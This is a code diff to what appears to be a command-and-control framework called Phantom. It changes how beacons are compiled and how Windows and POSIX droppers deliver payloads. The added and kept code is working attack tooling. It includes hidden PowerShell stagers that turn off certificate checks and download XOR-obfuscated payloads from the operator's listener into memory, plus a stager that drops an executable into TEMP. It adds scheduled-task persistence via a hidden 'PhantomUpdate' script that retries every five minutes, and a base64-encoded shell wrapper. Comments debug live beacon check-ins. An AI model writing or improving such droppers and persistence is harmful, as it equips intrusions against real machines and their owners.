@@ -361,6 +361,33 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                     "c2.front_cert or drop certs/front.crt.")
         except Exception:
             pass
+    if use_ssl and not pin_cert:
+        # No TLS-terminating front: the beacon pins the LISTENER's own
+        # certificate and dials `host`, so that certificate must NAME
+        # `host` — schannel aborts a SAN mismatch client-side, before any
+        # HTTP request reaches us (live defect 2026-10-16: a certificate
+        # born for 0.0.0.0/SAN localhost was reused forever while beacons
+        # dialed 127.0.0.1, pin matched, and no check-in ever arrived).
+        # Ensure coverage here, where the dial host is known, and warn if
+        # the material rotated under an already-running listener.
+        try:
+            from phantom.utils.state import use_mtls
+            if use_mtls():
+                from phantom.utils.beacon_auth import ensure_mtls_material
+                from phantom.utils.c2_crypto import server_cert_fingerprint
+                _pin_before = server_cert_fingerprint("")
+                ensure_mtls_material(None, host)
+                _pin_after = server_cert_fingerprint("")
+                if _pin_after and _pin_before != _pin_after:
+                    notifier.warn(
+                        f"C2 certificate regenerated for '{host}': the old "
+                        "one did not cover it, so the client would have "
+                        "aborted the handshake. This build pins the NEW "
+                        "certificate — restart the https listener now "
+                        "(listeners stop, then start) or it keeps serving "
+                        "the old one and every check-in dies on the pin.")
+        except Exception:
+            pass
     _cert_pin = beacon_pin(pin_cert)
     _pk_pin = beacon_pubkey_pin(pin_cert)
     # A-2: a TLS beacon with NO pin and NO mTLS cannot authenticate the peer,
@@ -902,19 +929,51 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
 # up, so the task name and the retry script path are deterministic (see
 # `_RETRY_TASK_WIN`, `_RETRY_SCRIPT`) and the cleanup section can find them.
 _RETRY_TASK_WIN = "PhantomUpdate"
+#: Where the retry script lands on the target. Deterministic like the POSIX
+#: one so cleanup can find it (a random name would leave persistence behind).
+_RETRY_SCRIPT_WIN = r"%TEMP%\PhantomUpdate.ps1"
 _RETRY_SCRIPT = "~/.cache/.p/r"
 _RETRY_CACHE = "~/.cache/.p"
 _RETRY_MINUTES = 5
 
+#: `schtasks /tr` refuses anything longer than this — the task is NOT created
+#: and the failure is a console line nobody sees when the stager runs hidden.
+#: Observed on this host (2026-10-16): "Il valore per l'opzione /tr non può
+#: superare i 261 caratteri" — raised by a stager whose retry command carried
+#: the full ~11 KB encoded payload inline. The retry path was therefore dead
+#: for every real dropper: the operator was told the delivery was "resilient"
+#: and it was a one-shot.
+_SCHTASKS_TR_MAX = 261
+
 
 def _ps_resilient(core_ps: str) -> str:
-    """Wrap the Windows PIC stager so a failed run schedules its retry."""
-    action = ("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "
-              + base64.b64encode(core_ps.encode("utf-16-le")).decode())
+    """Wrap the Windows PIC stager so a failed run schedules its retry.
+
+    The retry cannot travel inline: /tr tops out at ``_SCHTASKS_TR_MAX``
+    characters and a stager is 3000+ characters of base64. So the failure
+    path WRITES the retry to ``%TEMP%\\PhantomUpdate.ps1`` and schedules the
+    task against the file (the same shape the POSIX side already used with
+    ``~/.cache/.p/r``), and the retry removes the task and the file as soon
+    as one attempt gets through.
+    """
+    # runs FROM the scheduled task: one attempt, and on success it clears the
+    # task + script it was launched from (POSIX: "grep -v … | crontab -").
+    retry_body = ("$r=Join-Path $env:TEMP 'PhantomUpdate.ps1';"
+                  "$e=$null;try{" + core_ps + "}catch{$e=$_};"
+                  "if(-not $e){schtasks /delete /f /tn '" + _RETRY_TASK_WIN
+                  + "' 2>$null|Out-Null;"
+                  "if(Test-Path $r){Remove-Item -LiteralPath $r -Force -EA "
+                  "SilentlyContinue}}")
+    schedule = (
+        "$r=Join-Path $env:TEMP 'PhantomUpdate.ps1';"
+        "Set-Content -LiteralPath $r -Value '"
+        + retry_body.replace("'", "''") + "' -Force;"
+        "schtasks /create /f /tn '" + _RETRY_TASK_WIN + "' /sc minute "
+        "/mo " + str(_RETRY_MINUTES) + " /tr \"powershell -NoP -NonI -W "
+        "Hidden -Exec Bypass -File $r\"|Out-Null")
     return (
         "$e=$null;try{" + core_ps + "}catch{$e=$_};"
-        "if($e){schtasks /create /f /tn '" + _RETRY_TASK_WIN + "' /sc minute "
-        "/mo " + str(_RETRY_MINUTES) + " /tr \"" + action + "\"|Out-Null}"
+        "if($e){" + schedule + "}"
     )
 
 
@@ -942,6 +1001,47 @@ def _sh_resilient(command: str) -> str:
     return ("echo "
             + base64.b64encode(script.encode()).decode()
             + " | base64 -d | sh")
+
+
+def stager_mtls_conflict(platform: str, use_ssl: bool) -> str:
+    """Return the warning when the stager cannot satisfy the listener's mTLS.
+
+    ``c2.mtls_require_client_cert=true`` (the default) puts ``CERT_REQUIRED``
+    on the TLS context: a client with no certificate cannot get past the
+    handshake. The C++ beacon carries a client certificate baked in at BUILD
+    time, so the strict default never blocks a real deploy — but the
+    PowerShell PIC stager is a plain WebClient download with no certificate to
+    present, and ``generate`` was handing the operator a one-liner aimed at a
+    door its own default config keeps shut, with no warning at all.
+
+    Live evidence (2026-10-16, host MSI, strict mTLS on, listener healthy):
+    ``curl -k`` and ``Net.WebClient`` against ``/x`` both died mid-request
+    ("schannel: recv returned error 56" / "Connessione sottostante chiusa"),
+    and the operator only found out after the paste.
+
+    Returns "" when there is no conflict (non-Windows platform, plain HTTP,
+    mTLS off, or the documented opt-out).
+    """
+    if platform != "windows" or not use_ssl:
+        return ""
+    try:
+        from phantom.utils.state import use_mtls
+        if not use_mtls():
+            return ""
+        from phantom.utils import config as _cfg
+        strict = _cfg.get_bool("c2.mtls_require_client_cert", True,
+                               env="PHANTOM_MTLS_REQUIRE_CLIENT_CERT")
+    except Exception:
+        strict = True
+    if not strict:
+        return ""
+    return ("WARNING: this dropper cannot satisfy the listener's mTLS — "
+            "c2.mtls_require_client_cert=true demands a client certificate at "
+            "the TLS layer and the PowerShell stager has none to present, so "
+            "the download WILL be refused. Either deliver the compiled beacon "
+            "binary (it carries the build-time certificate), or set "
+            "c2.mtls_require_client_cert=false (HTTPS with app-layer HMAC "
+            "authentication; `doctor` flags the posture).")
 
 
 def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", dl_port: int = None, use_ssl: bool = False, resilient: bool = True) -> str:
@@ -1009,6 +1109,7 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
             # trigger string never appears whole in the script.
             "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
             "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
+            "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
             "$b=[byte[]](New-Object Net.WebClient).DownloadData('" + url + "')|%{[byte]($_ -bxor170)};"
             "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
             "$k=[Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName-eq('kernel'+'32'+'.dll')}|%{$_.BaseAddress};"
@@ -1473,6 +1574,7 @@ def generate_remote_dropper(platform: str, lhost: str, lport: int,
         url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_windows?{token_param}"
         ps = (
             "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
+            "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
             "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
             "$d=[IO.Path]::Combine($env:TEMP,'srv'+(Get-Random)+'.exe');"
             "(New-Object Net.WebClient).DownloadFile('" + url + "',$d);"
